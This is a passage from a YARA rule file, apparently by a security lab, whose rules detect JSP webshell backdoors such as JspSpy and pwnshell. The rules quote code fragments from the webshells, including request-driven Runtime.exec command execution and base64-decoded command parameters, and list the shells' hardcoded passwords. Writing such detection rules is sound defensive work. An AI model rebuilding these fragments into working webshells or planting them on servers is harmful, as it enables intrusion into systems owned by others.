        $s11 = "//ResultSetMetaData rmeta = rs.getMetaData();" fullword ascii
        $s12 = "String ln = request.getParameter(\"ln\");" fullword ascii
        $s13 = "<%@ page import=\"java.sql.*\" %>" fullword ascii
        $s14 = "int gavin_downNum = endNum - startNum;                  //" fullword ascii
        $s15 = "Statement statement = connection.createStatement();" fullword ascii
        $s16 = "String userName=\"root\";" fullword ascii
        $s17 = "String userPasswd=\"root\";" fullword ascii
        $s18 = "if(i == (multiple-1)) MAX_LIMIT_NUM += complement;" fullword ascii
        $s19 = "int endNum = Integer.valueOf(request.getParameter(\"en\"));      //" fullword ascii
        $s20 = "int startNum = Integer.valueOf(request.getParameter(\"sn\"));      //" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 7KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_7eb3278d8a711fbf2058be163ed86fd7d5d4ddea
{
    meta:
        description = "jsp - file 7eb3278d8a711fbf2058be163ed86fd7d5d4ddea.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "678805f0f5a90ced28c0b4c430c367220f2e315372a4f615f3b47b377c739d77"
    strings:
        $x1 = "welcomeMsg =  \"welcome to pwnshell! - <a target='_new' href='http://i8jesus.com/stuff/pwnshell/'>http://i8jesus.com/stuff/pwns" fullword ascii
        $x2 = "welcomeMsg =  \"welcome to pwnshell! - <a target='_new' href='http://i8jesus.com/stuff/pwnshell/'>http://i8jesus.com/stuff/pwnsh" ascii
        $x3 = "a);b.datepicker._updateDatepicker(a)}}catch(d){b.datepicker.log(d)}return true},_showDatepicker:function(a){a=a.target||" fullword ascii
        $x4 = "* Copyright 2010, AUTHORS.txt (http://jqueryui.com/about)" fullword ascii
        $x5 = "\"\",d]);this._datepickerShowing=false;this._lastInput=null;if(this._inDialog){this._dialogInput.css({position:\"absolute\",left" ascii
        $s6 = "false;C.onload=C.onreadystatechange=function(){if(!B&&(!this.readyState||this.readyState===\"loaded\"||this.readyState===\"compl" ascii
        $s7 = "for(var p=0,v=n.order.length;p<v;p++){var t=n.order[p];if(q=n.leftMatch[t].exec(g)){var y=q[1];q.splice(1,1);if(y.substr(y.len" fullword ascii
        $s8 = "Date?this._formatDate(a,d):d;this._dialogInput.val(d);this._pos=j?j.length?j:[j.pageX,j.pageY]:null;if(!this._pos)this._pos=[d" fullword ascii
        $s9 = "sb.append(\"<span class='directory'><a class='dirs' href='javascript:goToDirectory(\\\"\" + encoded + \"\\\")'>\");" fullword ascii
        $s10 = "Process p = Runtime.getRuntime().exec(" fullword ascii
        $s11 = "xa){xa=true;if(s.readyState===\"complete\")return c.ready();if(s.addEventListener){s.addEventListener(\"DOMContentLoaded\"," fullword ascii
        $s12 = "<% /* pwnshell.jsp - www.i0day.com */ %>" fullword ascii
        $s13 = "(function(b,c){function f(){this.debug=false;this._curInst=null;this._keyEvent=false;this._disabledInputs=[];this._inDialog=th" fullword ascii
        $s14 = "ate(a.target);h=a.ctrlKey||a.metaKey;break;case 36:if(a.ctrlKey||a.metaKey)b.datepicker._gotoToday(a.target);h=a.ctrlKey||" fullword ascii
        $s15 = "return false;case 27:b.datepicker._hideDatepicker();break;case 33:b.datepicker._adjustDate(a.target,a.ctrlKey?-b.datepicker._g" fullword ascii
        $s16 = "ction(a){var b,d,f,e;a=arguments[0]=c.event.fix(a||A.event);a.currentTarget=this;b=a.type.indexOf(\".\")<0&&!a.exclusive;" fullword ascii
        $s17 = "parseInt(k[2],16),parseInt(k[3],16)];if(k=/#([a-fA-F0-9])([a-fA-F0-9])([a-fA-F0-9])/.exec(l))return[parseInt(k[1]+k[1],16),par" fullword ascii
        $s18 = "String finalPath = getExecutableFromPath(cmd);" fullword ascii
        $s19 = "urrentMonth,a.currentDay));return this.formatDate(this._get(a,\"dateFormat\"),d,this._getFormatConfig(a))}});b.fn.datepicker=" fullword ascii
        $s20 = "ata.datepicker\",function(i,j){return this._get(d,j)});b.data(a,\"datepicker\",d);this._setDate(d,this._getDefaultDate(d)," fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 900KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule bf7d2a8eede3d38f8d3c7491fed173dd746d4b55
{
    meta:
        description = "jsp - file bf7d2a8eede3d38f8d3c7491fed173dd746d4b55.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "bb809d10d8dc0be89123e35d659513fb49faed3aea32c1facfcc9d21ad39f422"
    strings:
        $x1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009 Private </a></s" ascii
        $s2 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009 Private </a></s" ascii
        $s3 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2009 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
        $s4 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2009 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
        $s5 = "private static final String PW = \"icesword\"; //password" fullword ascii
        $s6 = "t.getHeader(\"host\")+\" (<span id='ip'>\"+InetAddress.getLocalHost().getHostAddress()+\"</span>) | <a href=\\\"javascript:if (!" ascii
        $s7 = "\"    <hr/>Export \\\"<span style='color:red;font-weight:bold'>\"+(Util.isEmpty(sql) ? table : sql.replaceAll(\"\\\"\",\"&quot;" ascii
        $s8 = "clipboardData){alert('only support IE!');}else{void(window.clipboardData.setData('Text', document.getElementById('ip').innerText" ascii
        $s9 = "byte[] b = colName.getBytes();" fullword ascii
        $s10 = "byte[] b = v.getBytes();" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule dbff4ab1cb157db88dc3542a8c96b9ed0cc6ba2b
{
    meta:
        description = "jsp - file dbff4ab1cb157db88dc3542a8c96b9ed0cc6ba2b.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "91f4ee44392649bcb043b8d9db2ed42186934e065dc31241c8da7076c6e9e575"
    strings:
        $s1 = "Process p = Runtime.getRuntime().exec(" fullword ascii
        $s2 = "Hashtable ht = parser.processData(request.getInputStream()," fullword ascii
        $s3 = "<a href=\"http://bbs.sy866.net\" target=\"_blank\">http://bbs.sy866.net</a> By " fullword ascii
        $s4 = "sbFolder.append(\"','\"+formatPath(strDir)+\"\\\\\\\\hZipFile.zip','\" + strCmd + \"','1','');\\\">\");" fullword ascii
        $s5 = "X-files:<a href=\"http://www.google.com\" target=\"_blank\">http://www.google.com</a> <a href=\"http://www.google.cn\" target=\"" ascii
        $s6 = "X-files:<a href=\"http://www.google.com\" target=\"_blank\">http://www.google.com</a> <a href=\"http://www.google.cn\" target=\"" ascii
        $s7 = "public Hashtable processData(ServletInputStream is, String boundary," fullword ascii
        $s8 = "onClick=\"return expandcontent('menu2', this)\"><%=strCommand[languageNo]%></a>" fullword ascii
        $s9 = "out.println(\"<li>Start Memory:\" + startMem + \"</li>\");" fullword ascii
        $s10 = "&& request.getParameter(\"password\").equals(password)) {" fullword ascii
        $s11 = "\"cmd /c \" + strCmd);" fullword ascii
        $s12 = "out.println(\"<li>End Memory:\" + endMem + \"</li>\");" fullword ascii
        $s13 = "out.println(\"<li>Total Memory:\" + total + \"</li>\");" fullword ascii
        $s14 = "out.println(\"<li>Use Time: \" + (endTime - startTime) + \"</li>\");" fullword ascii
        $s15 = "out.println(\"<li>Use memory: \" + (startMem - endMem) + \"</li>\");" fullword ascii
        $s16 = "&lt;li&gt;&lt;%=key%&gt;:&lt;%=props.get(key)%&gt;&lt;/li&gt;<br />" fullword ascii
        $s17 = "if (request.getParameter(\"password\") != null" fullword ascii
        $s18 = "sbFolder.append(\"- - - - - - - - - - - </td></tr>\\r\\n\");" fullword ascii
        $s19 = "String[] strExecute = { \"" fullword ascii
        $s20 = "sbFile.append(\"\" + list[i].getName());" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 8 of them ) ) or ( all of them )
}

rule cb68d7535631dc7c823afd6ad8e5aa838bccd374
{
    meta:
        description = "jsp - file cb68d7535631dc7c823afd6ad8e5aa838bccd374.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ef63eb867061b4b442ec4dc81fe92db3f716da56b82ba14895979c3c0be569a6"
    strings:
        $x1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009 Private </a></s" ascii
        $s2 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009 Private </a></s" ascii
        $s3 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2009 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
        $s4 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2009 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
        $s5 = "private static final String PW = \"admin\"; //password" fullword ascii
        $s6 = "t.getHeader(\"host\")+\" (<span id='ip'>\"+InetAddress.getLocalHost().getHostAddress()+\"</span>) | <a href=\\\"javascript:if (!" ascii
        $s7 = "\"    <hr/>Export \\\"<span style='color:red;font-weight:bold'>\"+(Util.isEmpty(sql) ? table : sql.replaceAll(\"\\\"\",\"&quot;" ascii
        $s8 = "clipboardData){alert('only support IE!');}else{void(window.clipboardData.setData('Text', document.getElementById('ip').innerText" ascii
        $s9 = "byte[] b = colName.getBytes();" fullword ascii
        $s10 = "byte[] b = v.getBytes();" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_9a7309e40f3173d1c96144fa3ded4b58ebcb0c90
{
    meta:
        description = "jsp - file 9a7309e40f3173d1c96144fa3ded4b58ebcb0c90.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a063d05eac21c1a6eb046c90f770b5f769890034b9daf7dfda58fc749c330b2b"
    strings:
        $s1 = "new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),\"exeRclientO\",olp).start();//?????????" fullword ascii
        $s2 = "private static final String PW = \"592714\"; //password" fullword ascii
        $s3 = "8px;\\\" /> <input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Scan\\\" id=\\\"submit\\\" class=\\\"bt\\\" />\"+" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule b5729bda81828db973f74fd1c1448f48f81e4a6b
{
    meta:
        description = "jsp - file b5729bda81828db973f74fd1c1448f48f81e4a6b.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8aa5dca21b414254d8f772487dd8569b0753813535b3ce1430609f9e52f3fe4c"
    strings:
        $s1 = "private static final String PW = \"nian1106\"; //password" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 200KB and ( all of them ) ) or ( all of them )
}

rule ZombieBoy
{
    meta:
        description = "jsp - file ZombieBoy.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6e84e277a9615a2384d2a0313a7581e726c504235715b9e5847b36c13bfb7e87"
    strings:
        $s1 = "ite(request.getParameter(\"c\").getBytes());%> ZombieBoy!!" fullword ascii
    condition:
        ( uint16(0) == 0x7942 and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule c7303f1a6c0f8dcb2d54086570a862364a68b047
{
    meta:
        description = "jsp - file c7303f1a6c0f8dcb2d54086570a862364a68b047.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ad54cd37b150597ec7032b391507addfb6b871711e5cbf28ccb213dd1855ef5c"
    strings:
        $s1 = "<td align=\"right\">darkst by <a href=\"mailto:376186027@qq.com\">New4</a> and welcome to <a href=\"http://www.darkst.com\" targ" ascii
        $s2 = "<td align=\"right\">darkst by <a href=\"mailto:376186027@qq.com\">New4</a> and welcome to <a href=\"http://www.darkst.com\" targ" ascii
        $s3 = "<td><a title=\\\"\" + files[n].getName() + \"\\\">\" + strCut(files[n].getName(), 50) + \"</a></td>\\n\";" fullword ascii
        $s4 = "document.fileList.action = \\\"\" + curUri + \"&curPath=\" + path + \"&fsAction=copyto&dstPath=\" + \"\\\" + toPath;\\n\";" fullword ascii
        $s5 = "<td>[<a href=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\">" fullword ascii
        $s6 = "ydC9mb3JtLWRhdGE7Pj47bDxpPDE5Pjs+O2w8dDxAMDw7Ozs7Ozs7Ozs7Pjs7Pjs+Pjs+PjtsPE5ld0ZpbGU7TmV3RmlsZTtOZXdEaXJlY3Rvcnk7TmV3RGlyZWN0b3J" ascii /* base64 encoded string 't/form-data;>>;l<i<19>;>;l<t<@0<;;;;;;;;;;>;;>;>>;>>;l<NewFile;NewFile;NewDirectory;NewDirector' */
        $s7 = "ut(files[n].getName(), 50) + \"&gt;</a></td>\\n\";" fullword ascii
        $s8 = "private String _password = \"156156\";" fullword ascii
        $s9 = "ert(files[n].getPath()) + \"</a></td>\\n\";" fullword ascii
        $s10 = "<td width=\\\"15%\\\" align=\\\"center\\\">\" + files[n].length() + \"</td>\\n\";" fullword ascii
        $s11 = "document.dbInfo.sql.value = \\\"\\\";\";" fullword ascii
        $s12 = "<textarea name=\\\"fileContent\\\" cols=\\\"80\\\" rows=\\\"32\\\">\\n\";" fullword ascii
        $s13 = "5O0RCX3JCX01TU1FMO0RCX3JCX01TU1FMO0RCX3JCX0FjY2VzcztEQl9yQl9BY2Nlc3M7Pj7Z5iNIVOaWZWuK0pv8lCMSbhytgQ==\" />" fullword ascii
        $s14 = "document.openfile.action=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\" + fileName + \\\"&fsAction=" ascii
        $s15 = "sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + curUri + \"&curPath=\" + path + \"&fsAction=open\" + \"\\\" />" ascii
        $s16 = "document.openfile.action=\\\"\" + curUri + \"&curPath=\" + pathConvert(curFile.getParent()) + \"\\\" + fileName + \\\"&fsAction=" ascii
        $s17 = "<TD align=\"left\"><FONT face=\"webdings\" color=\"#ffffff\"> 8</FONT><FONT face=\"Verdana, Arial, Helvetica, sans-serif\" c" fullword ascii
        $s18 = "<form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath=\" + path " ascii
        $s19 = "<form enctype=\\\"multipart/form-data\\\" method=\\\"post\\\" name=\\\"upload\\\" action=\\\"\" + curUri + \"&curPath=\" + path " ascii
        $s20 = "\\\">edit</a>>\" : \"\") + \"</td>\\n\";" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule sig_22cdab3507ae20c2cab0989a95a83ca6850114e3
{
    meta:
        description = "jsp - file 22cdab3507ae20c2cab0989a95a83ca6850114e3.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "187da8cd1ec2bbd3fb7bc6e5aa90300a507c0c1f3556d472b3492a978f337f36"
    strings:
        $x1 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!String Pwd=\"kfc\";String cs=\"UTF-8\";String EC(" ascii
        $s2 = "substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}e" ascii
        $s3 = "k=0; k < x.length; k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse r)throws Exce" fullword ascii
        $s4 = "g[] x=s.trim().split(\"\\r\\n\");Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(\"select" ascii
        $s5 = "File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0; i<d.length();i+=2){os.write((h.indexOf(d.cha" fullword ascii
        $s6 = "ws Exception{Connection c=GC(s);Statement m=c.createStatement(1005,1008);BufferedWriter bw=null;try{ResultSet r=m.executeQuery(q" ascii
        $s7 = "eption e){sb.append(\"ERROR\"+\":// \"+e.toString());}sb.append(\"|\"+\"<-\");out.print(sb.toString());%>" fullword ascii
        $s8 = "Exception{File sf=new File(s),df=new File(d);sf.renameTo(df);}void JJ(String s)throws Exception{File f=new File(s);f.mkdir();}v" fullword ascii
        $s9 = "1; i <=n; i++){sb.append(d.getColumnName(i)+\"\\t|\\t\");}sb.append(\"\\r\\n\");if(q.indexOf(\"--f:\")!=-1){File file=new File(p" ascii
        $s10 = "FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection) u.openConnection();InputStream is=h.getInput" ascii
        $s11 = ".indexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f:\")):q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(in" ascii
        $s12 = "(\"z1\")+\"\");String z2=EC(request.getParameter(\"z2\")+\"\");sb.append(\"->\"+\"|\");String s=request.getSession().getServletC" ascii
        $s13 = "\"--f:\")!=-1){bw.write(r.getObject(i)+\"\"+\"\\t\");bw.flush();}else{sb.append(r.getObject(i)+\"\"+\"\\t|\\t\");}}if(bw!=null){" ascii
        $s14 = "cs=request.getParameter(\"z0\")!=null?request.getParameter(\"z0\")+\"\":cs;response.setContentType(\"text/html\");response.setCh" ascii
        $s15 = "b.append(\"Execute Successfully!\\t|\\t\\r\\n\");}catch(Exception ee){sb.append(ee.toString()+\"\\t|\\t\\r\\n\");}}m.close();c.c" ascii
        $s16 = "}sb.append(\"\\r\\n\");}r.close();if(bw!=null){bw.close();}}catch(Exception e){sb.append(\"Result\\t|\\t\\r\\n\");try{m.executeU" ascii
        $s17 = "a.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}void LL(String s,String d)throws Exception{URL u=new URL(s);int n=0;" ascii
        $s18 = "s)throws Exception{return new String(s.getBytes(\"ISO-8859-1\"),cs);}Connection GC(String s)throws Exception{String[] x=s.trim()" ascii
        $s19 = "Stream(new FileInputStream(s));os.write((\"->\"+\"|\").getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write" ascii
        $s20 = "x[4],x[2].equalsIgnoreCase(\"[/null]\")?\"\":x[2],x[3].equalsIgnoreCase(\"[/null]\")?\"\":x[3]);}else{Connection c=DriverManager" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_2637c0522970b6e02d040b305d6bc3826ef58eab
{
    meta:
        description = "jsp - file 2637c0522970b6e02d040b305d6bc3826ef58eab.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9305e2ba9d9fe2b4dfe9a1d34df28d14a54cc2705d326fbb25f5450bc863934f"
    strings:
        $x1 = "Process child = Runtime.getRuntime().exec(k8cmd);" fullword ascii
        $s2 = "String cmd = request.getParameter(\"k8\");" fullword ascii
        $s3 = "if(cmd.equals(\"Szh0ZWFt\")){out.print(\"[S]\"+dir+\"[E]\");}" fullword ascii
        $s4 = "System.err.println(e);" fullword ascii
        $s5 = "InputStream in = child.getInputStream();" fullword ascii
        $s6 = "while ((c = in.read()) != -1) {" fullword ascii
        $s7 = "<%@page import=\"sun.misc.BASE64Decoder\"%>" fullword ascii
        $s8 = "String dir=new File(path).getParent();" fullword ascii
        $s9 = "byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);" fullword ascii
        $s10 = "String path=application.getRealPath(request.getRequestURI());" fullword ascii
        $s11 = "String k8cmd = new String(binary);" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 2KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule c37d64f4f1b8cbbb0369eb1e192ed5eb437fdba8
{
    meta:
        description = "jsp - file c37d64f4f1b8cbbb0369eb1e192ed5eb437fdba8.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "df87bec770122ec22c5f2b09b1d4d00fabd10068729af31286e9991196ef91cb"
    strings:
        $s1 = "testtesttest\",\"\").getBytes());%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_0d4b369f7cba724aaa4962caf463c5cfb915a141
{
    meta:
        description = "jsp - file 0d4b369f7cba724aaa4962caf463c5cfb915a141.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8f3cbb8d25d2371f2366f0cfbba3cb1e86dff7f5df90278be186abfc03d930be"
    strings:
        $x1 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009 Private </a></s" ascii
        $s2 = "<td><span style=\\\"float:right;\\\"><a href=\\\"http://www.forjj.com\\\" target=\\\"_blank\\\">JspSpy Ver: 2009 Private </a></s" ascii
        $s3 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2009 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
        $s4 = "\"<!--<span style=\\\"font:11px Verdana;\\\">Copyright &copy; 2009 NinTy </span><a href=\\\"http://www.forjj.com\\\" target=\\\"" ascii
        $s5 = "private static final String PW = \"s3ctesting\"; //password" fullword ascii
        $s6 = "t.getHeader(\"host\")+\" (<span id='ip'>\"+InetAddress.getLocalHost().getHostAddress()+\"</span>) | <a href=\\\"javascript:if (!" ascii
        $s7 = "\"    <hr/>Export \\\"<span style='color:red;font-weight:bold'>\"+(Util.isEmpty(sql) ? table : sql.replaceAll(\"\\\"\",\"&quot;" ascii
        $s8 = "clipboardData){alert('only support IE!');}else{void(window.clipboardData.setData('Text', document.getElementById('ip').innerText" ascii
        $s9 = "byte[] b = colName.getBytes();" fullword ascii
        $s10 = "byte[] b = v.getBytes();" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_0d980bb944a1021431fc0b2d805c5c31994ca486
{
    meta:
        description = "jsp - file 0d980bb944a1021431fc0b2d805c5c31994ca486.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "07d1e01f53e545b61e0c1fea9f035f3e9fe51da027fe34d962f5ba6a19ca09ad"
    strings:
        $s1 = "response.setHeader(\"Content-Disposition\", \"attachment;filename=\\\"\" + file.getName() + \"\\\";filename*=UTF-" fullword ascii
        $s2 = "public Shell(HttpServletRequest request, HttpServletResponse response, HttpSession session, JspContext context, ServletC" fullword ascii
        $s3 = "return request.getMethod().toUpperCase().equals(\"POST\") && \"login-form\".equals(request.getParameter(\"form-name\"));" fullword ascii
        $s4 = "fileInfo.put(\"download_url\", getUrl(\"download\", file.getAbsolutePath()));" fullword ascii
        $s5 = "return blockUtil == null ? 0 : (int) (Math.max(0, blockUtil - System.currentTimeMillis()) / 1000);" fullword ascii
        $s6 = "public boolean onService(HttpServletRequest request, HttpServletResponse response, HttpSession session, JspContext context, " fullword ascii
        $s7 = "data.put(\"breadcrumb\", getBreadCrumb(data.get(\"pwd\").toString()));" fullword ascii
        $s8 = "if (Config.USER.equals(userName) && Config.PASSWORD.equals(password)) {" fullword ascii
        $s9 = "Long blockUtil = System.currentTimeMillis() + Config.BLOCKING_TIME * 1000;" fullword ascii
        $s10 = "//System.out.println(System.getProperty(\"user.home\"));" fullword ascii
        $s11 = "data.put(\"username\", session.getAttribute(\"_user\"));" fullword ascii
        $s12 = "element.appendChild(createElement(doc, entry.getKey().toString(), entry.getValue()));" fullword ascii
        $s13 = "path = path.replaceFirst(\"^~\", System.getProperty(\"user.home\", \"/\"));" fullword ascii
        $s14 = "Shell shell = new Shell(request, response, session, context, application, config, out);" fullword ascii
        $s15 = "return Config.USER.equals(session.getAttribute(\"_user\"));" fullword ascii
        $s16 = "String path = System.getProperty(\"user.dir\", \"/\");" fullword ascii
        $s17 = "Files.copy(Paths.get(file.getAbsolutePath()), response.getOutputStream());" fullword ascii
        $s18 = "fileInfo.put(\"delete_url\", getUrl(\"delete\", file.getAbsolutePath()));" fullword ascii
        $s19 = "String password = getParam(\"password\", \"\").trim();" fullword ascii
        $s20 = "protected List<HashMap<String, String>> getBreadCrumb(String path) {" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 60KB and ( 8 of them ) ) or ( all of them )
}

rule e5c63e8a655f8f03566c39c84c4aa417e194db14
{
    meta:
        description = "jsp - file e5c63e8a655f8f03566c39c84c4aa417e194db14.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
    strings:
        $x1 = "<center><a href=\"http://www.topronet.com\" target=\"_blank\">www.topronet.com</a> ,All Rights Reserved." fullword ascii
        $x2 = "Process p=Runtime.getRuntime().exec(strCommand,null,new File(strDir));" fullword ascii
        $s3 = "http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>" ascii
        $s4 = "http://www.topronet.com </font>\",\" <font color=red> Thanks for your support - - by Steven Cee http://www.topronet.com </font>" ascii
        $s5 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
        $s6 = "<a href=\"http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx\" target=\"_blank\">http://blog.csdn.net/cqq/archive/2004/11/1" ascii
        $s7 = "System.out.println(strCommand);" fullword ascii
        $s8 = "<br>Any question, please email me cqq1978@Gmail.com" fullword ascii
        $s9 = "cqq1978@Gmail.com" fullword ascii
        $s10 = "strCommand[1]=strShell[1];" fullword ascii
        $s11 = "strCommand[0]=strShell[0];" fullword ascii
        $s12 = "//Properties prop = new Properties(System.getProperties());  " fullword ascii
        $s13 = "sb.append(\" <a href=\\\"javascript:doForm('','\"+roots[i]+strSeparator+\"','','','1','');\\\">\");" fullword ascii
        $s14 = "<li><a href=\"http://www.topronet.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
        $s15 = "<title>JFoler 1.0 ---A jsp based web folder management tool by Steven Cee</title>" fullword ascii
        $s16 = "<li><a href=\"http://www.topronet.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
        $s17 = "//out.println(path + f1.getName());" fullword ascii
        $s18 = "String[] strCommand=new String[3];" fullword ascii
        $s19 = "private final static int languageNo=1; //Language,0 : Chinese; 1:English" fullword ascii
        $s20 = "out.println(\"error,upload \");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 90KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule fc7043aaac0ee2d860d11f18ddfffbede9d07957
{
    meta:
        description = "jsp - file fc7043aaac0ee2d860d11f18ddfffbede9d07957.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2d89359c199d77c6bc80758793fdcdc7baf14eea629222cf13d8ad775fce6452"
    strings:
        $s1 = "Connection conn= DriverManager.getConnection(url,user,password);" fullword ascii
        $s2 = "ResultSet rs=stmt.executeQuery(sql);" fullword ascii
        $s3 = "<meta http-equiv=Content-Type content=\"text/html; charset=gb2312\">" fullword ascii
        $s4 = "Statement stmt=conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);" fullword ascii
        $s5 = "String password=\"oracle_password\";" fullword ascii
        $s6 = "<td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td><td>7</td><td>8</td><td>9</td><td>10</td>" fullword ascii
        $s7 = "String url=\"jdbc:oracle:thin:@localhost:1521:orcl\";" fullword ascii
        $s8 = "String sql=\"SELECT 1,2,3,4,5,6,7,8,9,10 from user_info\";" fullword ascii
        $s9 = "body{margin-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;}" fullword ascii
        $s10 = "<td><%=rs.getString(9)%></td>" fullword ascii
        $s11 = "<td><%=rs.getString(4)%></td>" fullword ascii
        $s12 = "<td><%=rs.getString(3)%></td>" fullword ascii
        $s13 = "<td><%=rs.getString(8)%></td>" fullword ascii
        $s14 = "<td><%=rs.getString(5)%></td>" fullword ascii
        $s15 = "<td><%=rs.getString(10)%></td>" fullword ascii
        $s16 = "<td><%=rs.getString(6)%></td>" fullword ascii
        $s17 = "<td><%=rs.getString(2)%></td>" fullword ascii
        $s18 = "<td><%=rs.getString(1)%></td>" fullword ascii
        $s19 = "<td><%=rs.getString(7)%></td>" fullword ascii
        $s20 = "<%Class.forName(\"oracle.jdbc.driver.OracleDriver\").newInstance();" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 4KB and ( 8 of them ) ) or ( all of them )
}

rule dcf3908bc77f30cbd88cec26b0a6719fccc3c7f0
{
    meta:
        description = "jsp - file dcf3908bc77f30cbd88cec26b0a6719fccc3c7f0.jsp"
        company = "WatcherLab"
